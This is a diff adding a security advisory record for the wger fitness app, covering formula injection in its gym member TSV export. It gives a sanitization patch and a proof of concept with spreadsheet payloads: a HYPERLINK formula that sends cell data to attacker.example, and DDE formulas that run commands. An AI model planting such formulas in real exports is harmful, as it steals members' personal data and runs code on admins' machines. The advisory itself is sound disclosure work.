@@ -1,0 +1,59 @@
+{
+  "id": "GHSA-xq9m-hmp9-fw87",
+  "modified": "2026-05-06T20:03:57.191018Z",
+  "published": "2026-05-06T19:48:16Z",
+  "summary": "wger: CSV/TSV formula injection in gym member export (first_name/last_name)",
+  "details": "### Summary\n\nThe gym member TSV export endpoint in wger writes `first_name` and `last_name` profile fields verbatim to TSV cells with no formula-prefix sanitization. Any gym member (including newly self-registered users) can pre-load a spreadsheet formula into their own profile. When a gym admin later exports the member list and opens the file in Excel, LibreOffice Calc, or Google Sheets, the formula executes in the admin's local spreadsheet context — enabling data exfiltration and, on legacy Excel with DDE enabled, arbitrary local code execution.\n\n### Details\n\n**File**: `wger/gym/views/export.py`, approximately line 73\n\n```python\n# VULNERABLE - wger/gym/views/export.py\nwriter.writerow([\n    user.id,\n    gym.name,\n    user.username,\n    user.email,\n    user.first_name,   # written verbatim - no formula prefix sanitization\n    user.last_name,    # written verbatim\n    ...\n])\n```\n\nPython's `csv.writer` does not escape spreadsheet formula triggers (`=`, `+`, `-`, `@`, `\\t`, `\\r`). Any gym member can set their `first_name` to `=HYPERLINK(\"http://attacker.example/?p=\"\u0026A1,\"click\")` via the profile edit endpoint. The string is stored in the database and reproduced without modification in every subsequent TSV export. When a gym admin opens the resulting file in a formula-evaluating spreadsheet application, the formula executes in their local context — outside the wger server boundary.\n\n**Affected endpoints**:\n- `GET /en/gym/export/users/\u003cgym_pk\u003e` -\u003e `wger.gym.views.export` (TSV download)\n- Profile fields injected via profile edit endpoint (first_name/last_name)\n\n**Suggested patch**:\n\n```diff\n--- a/wger/gym/views/export.py\n+++ b/wger/gym/views/export.py\n+FORMULA_PREFIXES = ('=', '+', '-', '@', '\\t', '\\r')\n+\n+def sanitise_cell(value):\n+    \"\"\"Prefix formula-triggering strings with a single-quote to neutralise.\"\"\"\n+    s = str(value) if value is not None else ''\n+    if s and s[0] in FORMULA_PREFIXES:\n+        return \"'\" + s\n+    return s\n+\n writer.writerow([\n     user.id,\n     gym.name,\n     user.username,\n     user.email,\n-    user.first_name,\n-    user.last_name,\n+    sanitise_cell(user.first_name),\n+    sanitise_cell(user.last_name),\n     ...\n ])\n```\n\nPrepending `'` to any cell value beginning with `=`, `+`, `-`, or `@` is the standard OWASP-recommended mitigation for CSV/TSV formula injection. Apply `sanitise_cell` to all exported user-supplied fields, or subclass `csv.writer` to apply the sanitization globally for future fields.\n\n### PoC\n\nTested on `wger/server:latest` Docker image. Test users: gym member (any registered user) and trainer1 (`manage_gym` permission).\n\n**Step 1** - Inject formula payload into profile (any gym member, including self-registered):\n\n```\nPOST /en/user/\u003cuser_pk\u003e/overview HTTP/1.1\nHost: target\nContent-Type: application/x-www-form-urlencoded\nCookie: sessionid=[member_session]\n\nfirst_name=%3DHYPERLINK%28%22http%3A%2F%2Fattacker.example%2Fx%3Fp%3D%22%26A1%2C%22click%22%29\n```\n\nURL-decoded value: `=HYPERLINK(\"http://attacker.example/x?p=\"\u0026A1,\"click\")`\n\n**Step 2** - Gym admin exports member list:\n\n```\nGET /en/gym/export/users/2 HTTP/1.1\nHost: target\nCookie: sessionid=[trainer_session]\n\n-\u003e 200 OK\nContent-Disposition: attachment; filename=User-data-gym-2-[date].csv\n\n[... header row ...]\n2\tTestGym1\talice\talice@test.local\t=HYPERLINK(\"http://attacker.example/x?p=\"\u0026A1,\"click\")\t...\n```\n\n**Step 3** - Admin opens TSV in Excel, LibreOffice Calc, or Google Sheets:\n\n- Formula cell renders as clickable \"click\" hyperlink.\n- On click (or on file-open with DDE-enabled Excel): browser issues `GET http://attacker.example/x?p=[cell_A1_contents]`.\n- Attacker server receives exfiltrated spreadsheet data.\n\nConfirmed during testing: both `=cmd|calc.exe!A1` (DDE) and `=HYPERLINK(attacker.com)` payloads appear raw in the exported TSV response body.\n\nReproducibility: 2/2 runs after clean-baseline database reset.\n\n### Impact\n\nAny gym member (including self-registered users) can inject a spreadsheet formula into their own `first_name` or `last_name`. When a gym administrator with `manage_gym` permission later performs the routine member export and opens the TSV in a formula-evaluating spreadsheet application, the formula executes in the admin's local spreadsheet context:\n\n- **Data exfiltration**: other members' email addresses, phone numbers, and any PII displayed in adjacent cells can be posted to an attacker-controlled URL via `HYPERLINK` or `WEBSERVICE` functions.\n- **Local code execution** (legacy Excel with DDE enabled): payloads like `=cmd|'/c calc.exe'!A1` execute arbitrary commands on the admin's workstation.\n- **Phishing**: formulas can display admin-trusted text while silently redirecting on click.\n\n**Affected deployments**: every wger instance that delegates `manage_gym` to gym admins and where those admins periodically export the member list. The payload is stored persistently and survives indefinitely until the admin performs the export.\n\n**Severity**: High (CVSS 7.4). Network-reachable, stored payload triggered by legitimate admin workflow, scope unchanged (admin's local context), high confidentiality and integrity loss.\n\nThis is a standalone CWE-1236 vulnerability, independent of the `None != None` cluster of access-control findings. The fix is a small, local sanitization helper.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "wger",
+        "purl": "pkg:pypi/wger"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.6"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2rc1",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.6.1",
+        "1.7",
+        "1.8",
+        "1.9",
+        "2.0",
+        "2.1"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.5",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xq9m-hmp9-fw87/GHSA-xq9m-hmp9-fw87.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/wger-project/wger/security/advisories/GHSA-xq9m-hmp9-fw87"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/wger-project/wger"
+    }
+  ]
+}
